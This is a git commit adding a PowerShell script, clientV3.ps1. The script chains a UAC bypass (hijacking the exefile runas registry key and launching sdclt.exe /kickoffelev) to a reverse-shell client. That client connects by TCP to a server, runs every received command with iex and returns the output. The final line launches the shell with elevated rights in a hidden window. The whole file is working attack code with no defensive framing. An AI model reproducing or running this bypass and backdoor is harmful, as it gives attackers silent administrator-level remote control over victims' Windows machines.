7a4fac3cf59c0e67dae6da2c133da48a179eaa6b
noamz1 <32007964+noamz1@users.noreply.github.com>
2017-09-17 05:08:40 +0300

    Add files via upload

---
+++ clientV3.ps1
@@ -0,0 +1,115 @@
+﻿function Invoke-SDCLTBypass {
+
+
+    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
+    Param (
+        [Parameter(Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Command,
+
+        [Switch]
+        $Force
+    )
+    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
+
+    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
+        "UAC is set to 'Always Notify'. This module does not bypass this setting."
+        exit
+    }
+    else{
+        #Begin Execution
+        $exeCommandPath = "HKCU:\Software\Classes\exefile\shell\runas\command"
+
+        if ($Force -or ((Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue) -eq $null)){
+            New-Item $exeCommandPath -Force |
+                New-ItemProperty -Name 'IsolatedCommand' -Value $Command -PropertyType string -Force | Out-Null
+        }else{
+            Write-Warning "Key already exists, consider using -Force"
+            exit
+        }
+
+        if (Test-Path $exeCommandPath) {
+            Write-Verbose "Created registry entries to hijack the exe runas extension"
+        }else{
+            Write-Warning "Failed to create registry key, exiting"
+            exit
+        }
+
+        $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
+        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
+            $Process = Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru
+            Write-Verbose "Started sdclt.exe"
+        }
+
+        #Sleep 5 seconds 
+        Write-Verbose "Sleeping 5 seconds to trigger payload"
+        if (-not $PSBoundParameters['WhatIf']) {
+            Start-Sleep -Seconds 5
+        }
+
+        $exefilePath = "HKCU:\Software\Classes\exefile"
+
+        if (Test-Path $exefilePath) {
+            #Remove the registry entry
+            Remove-Item $exefilePath -Recurse -Force
+            Write-Verbose "Removed registry entries"
+        }
+
+        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
+            Stop-Process -Id $Process.Id
+            Write-Verbose "Killed running sdclt process"
+        }
+    }
+}
+
+$client ={      $address = 'localhost'
+      $port = 8000
+while ($true) {
+    do {
+        try {
+            #Write-Host "Trying to reach "$address":"$port
+            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
+            $stream = $client.GetStream()
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $reader = New-Object System.IO.StreamReader($stream)
+            break
+        }
+        catch {
+            Start-Sleep -s 10
+        }
+    } while ($true)
+    
+    #Write-Host "Connected"
+    # Execute commands sent by the server, and return output
+    try {
+        do {
+            $cmd = $reader.ReadLine()
+            if ($cmd -eq 'exit') {
+                #Write-Host "Exiting"
+                break
+            }
+            try {
+                $output = [string](iex $cmd)
+            }
+            catch {
+                $output = $_.Exception.Message
+            }
+            $writer.WriteLine($output)
+            $writer.Flush()
+        } while($true)
+    }
+    catch {
+        #Write-Host $_.Exception.Message
+    }
+    
+    # Cleanup
+    $writer.Close()
+    $reader.Close()
+    $stream.Close()
+    $client.Close()
+}}
+
+
+Invoke-SDCLTBypass -command  "powershell -window 1 -nop $client" -force
